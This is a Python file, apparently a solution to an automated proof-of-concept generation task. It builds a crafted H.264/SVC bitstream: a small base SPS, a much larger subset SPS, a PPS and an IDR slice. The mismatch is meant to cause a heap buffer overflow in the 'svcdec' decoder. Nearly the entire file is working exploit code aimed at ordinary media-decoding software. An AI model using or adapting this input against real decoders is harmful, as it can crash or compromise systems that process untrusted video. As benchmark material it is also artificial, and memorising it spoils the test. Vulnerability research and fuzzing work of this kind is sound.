class Solution:
    """
    Generates a Proof-of-Concept input for a heap buffer overflow in svcdec.
    The vulnerability is triggered when the display dimensions from a base layer
    SPS are used to allocate buffers, but then a subsequent subset SPS for an
    enhancement layer specifies much larger dimensions, leading to an out-of-bounds
    write when processing a slice that uses the subset SPS.
    """

    class _BitstreamWriter:
        """
        A helper class to write H.264 bitstream syntax elements.
        It builds a string of bits and then converts it to a byte sequence.
        """
        def __init__(self):
            self.bits = ""

        def write(self, value: int, num_bits: int):
            """Writes a value as a fixed number of bits."""
            if num_bits > 0:
                self.bits += format(value, '0' + str(num_bits) + 'b')

        def write_ue(self, value: int):
            """Writes an unsigned integer using Exp-Golomb coding."""
            value += 1
            length = value.bit_length()
            num_zeros = length - 1
            self.bits += '0' * num_zeros
            self.bits += bin(value)[2:]

        def write_se(self, value: int):
            """Writes a signed integer using Exp-Golomb coding."""
            if value <= 0:
                code_num = -2 * value
            else:
                code_num = 2 * value - 1
            self.write_ue(code_num)

        def get_rbsp(self) -> bytes:
            """
            Finalizes the bitstream into a Raw Byte Sequence Payload (RBSP).
            This includes adding the rbsp_stop_bit and padding to a full byte.
            """
            # Add stop bit '1'
            bits_with_stop = self.bits + '1'
            # Pad with '0's to be byte-aligned
            padded_bits = bits_with_stop + '0' * ((8 - len(bits_with_stop) % 8) % 8)
            
            byte_data = bytearray()
            for i in range(0, len(padded_bits), 8):
                byte_data.append(int(padded_bits[i:i+8], 2))
            return bytes(byte_data)

    @staticmethod
    def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
        """
        Converts an RBSP to an Encapsulated Byte Sequence Payload (EBSP)
        by adding emulation prevention bytes (0x03).
        """
        ebsp = bytearray()
        zeros = 0
        for byte in rbsp:
            if zeros >= 2 and byte <= 0x03:
                ebsp.append(0x03)
                zeros = 0
            
            if byte == 0x00:
                zeros += 1
            else:
                zeros = 0
            ebsp.append(byte)
        return bytes(ebsp)

    def _create_base_sps(self) -> bytes:
        """Creates the base layer Sequence Parameter Set (SPS) NAL unit."""
        writer = self._BitstreamWriter()
        
        # NAL Header: nal_ref_idc=3, nal_unit_type=7 (SPS) -> 0x67
        # Payload:
        writer.write(77, 8)  # profile_idc = Main
        writer.write(0, 8)   # constraint_set flags
        writer.write(40, 8)  # level_idc = 4.0
        writer.write_ue(0)   # seq_parameter_set_id

        writer.write_ue(0)   # log2_max_frame_num_minus4
        writer.write_ue(0)   # pic_order_cnt_type
        writer.write_ue(0)   # log2_max_pic_order_cnt_lsb_minus4

        writer.write_ue(1)   # max_num_ref_frames
        writer.write(0, 1)   # gaps_in_frame_num_value_allowed_flag

        # Small dimensions: 32x32 pixels
        writer.write_ue(1)   # pic_width_in_mbs_minus1 (1+1 macroblocks)
        writer.write_ue(1)   # pic_height_in_map_units_minus1 (1+1 macroblocks)
        
        writer.write(1, 1)   # frame_mbs_only_flag
        writer.write(1, 1)   # direct_8x8_inference_flag
        writer.write(0, 1)   # frame_cropping_flag
        writer.write(0, 1)   # vui_parameters_present_flag
        
        rbsp = writer.get_rbsp()
        ebsp = self._rbsp_to_ebsp(rbsp)
        return b'\x00\x00\x00\x01\x67' + ebsp

    def _create_subset_sps(self) -> bytes:
        """Creates the subset Sequence Parameter Set (SPS) NAL unit for SVC."""
        writer = self._BitstreamWriter()

        # NAL Header: nal_ref_idc=3, nal_unit_type=15 (Subset SPS) -> 0x6F
        # Payload (SPS part):
        writer.write(83, 8)  # profile_idc = SVC Baseline
        writer.write(0, 8)   # constraint_set flags
        writer.write(40, 8)  # level_idc = 4.0
        writer.write_ue(1)   # seq_parameter_set_id

        writer.write_ue(0)   # log2_max_frame_num_minus4
        writer.write_ue(0)   # pic_order_cnt_type
        writer.write_ue(0)   # log2_max_pic_order_cnt_lsb_minus4
        
        writer.write_ue(1)   # max_num_ref_frames
        writer.write(0, 1)   # gaps_in_frame_num_value_allowed_flag
        
        # Large dimensions: 1616x1616 pixels
        writer.write_ue(100) # pic_width_in_mbs_minus1 (100+1 macroblocks)
        writer.write_ue(100) # pic_height_in_map_units_minus1 (100+1 macroblocks)

        writer.write(1, 1)   # frame_mbs_only_flag
        writer.write(1, 1)   # direct_8x8_inference_flag
        writer.write(0, 1)   # frame_cropping_flag
        writer.write(0, 1)   # vui_parameters_present_flag

        # SVC Extension part (minimal values)
        writer.write(0, 1)   # inter_layer_deblocking_filter_control_present_flag
        writer.write(0, 2)   # extended_spatial_scalability
        writer.write(0, 1)   # chroma_phase_x_plus1_flag
        writer.write(0, 2)   # chroma_phase_y_plus1
        writer.write(0, 1)   # seq_ref_layer_chroma_phase_x_plus1_flag
        writer.write(0, 2)   # seq_ref_layer_chroma_phase_y_plus1
        writer.write_se(0)   # seq_scaled_ref_layer_left_offset
        writer.write_se(0)   # seq_scaled_ref_layer_top_offset
        writer.write_se(0)   # seq_scaled_ref_layer_right_offset
        writer.write_se(0)   # seq_scaled_ref_layer_bottom_offset
        writer.write(0, 1)   # seq_tcoeff_level_prediction_flag
        writer.write(0, 1)   # slice_header_restriction_flag
        writer.write(0, 1)   # svc_vui_parameters_present_flag

        rbsp = writer.get_rbsp()
        ebsp = self._rbsp_to_ebsp(rbsp)
        return b'\x00\x00\x00\x01\x6F' + ebsp

    def _create_pps(self) -> bytes:
        """Creates the Picture Parameter Set (PPS) NAL unit."""
        writer = self._BitstreamWriter()
        
        # NAL Header: nal_ref_idc=3, nal_unit_type=8 (PPS) -> 0x68
        # Payload:
        writer.write_ue(0)   # pic_parameter_set_id
        writer.write_ue(1)   # seq_parameter_set_id (references Subset SPS with large dims)
        
        writer.write(0, 1)   # entropy_coding_mode_flag
        writer.write(0, 1)   # bottom_field_pic_order_in_frame_present_flag
        writer.write_ue(0)   # num_slice_groups_minus1
        
        writer.write_ue(0)   # num_ref_idx_l0_default_active_minus1
        writer.write_ue(0)   # num_ref_idx_l1_default_active_minus1
        writer.write(0, 1)   # weighted_pred_flag
        writer.write(0, 2)   # weighted_bipred_idc
        
        writer.write_se(0)   # pic_init_qp_minus26
        writer.write_se(0)   # pic_init_qs_minus26
        writer.write_se(0)   # chroma_qp_index_offset
        
        writer.write(0, 1)   # deblocking_filter_control_present_flag
        writer.write(0, 1)   # constrained_intra_pred_flag
        writer.write(0, 1)   # redundant_pic_cnt_present_flag

        rbsp = writer.get_rbsp()
        ebsp = self._rbsp_to_ebsp(rbsp)
        return b'\x00\x00\x00\x01\x68' + ebsp

    def _create_idr_slice(self) -> bytes:
        """Creates a minimal IDR Slice NAL unit to trigger decoding."""
        writer = self._BitstreamWriter()

        # NAL Header: nal_ref_idc=3, nal_unit_type=5 (IDR Slice) -> 0x65
        # Payload (slice header):
        writer.write_ue(0)   # first_mb_in_slice
        writer.write_ue(7)   # slice_type (I_SLICE)
        writer.write_ue(0)   # pic_parameter_set_id
        
        # These field lengths depend on SPS values (log2_max..._minus4 = 0 -> 4 bits)
        writer.write(0, 4)   # frame_num
        writer.write_ue(0)   # idr_pic_id
        writer.write(0, 4)   # pic_order_cnt_lsb

        rbsp = writer.get_rbsp()
        ebsp = self._rbsp_to_ebsp(rbsp)
        return b'\x00\x00\x00\x01\x65' + ebsp

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball (unused)

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Create a sequence of NAL units that establishes a dimension mismatch
        # and then triggers the decoding process.
        base_sps_nal = self._create_base_sps()
        subset_sps_nal = self._create_subset_sps()
        pps_nal = self._create_pps()
        idr_slice_nal = self._create_idr_slice()
        
        # Concatenate the NAL units to form the final bitstream
        return base_sps_nal + subset_sps_nal + pps_nal + idr_slice_nal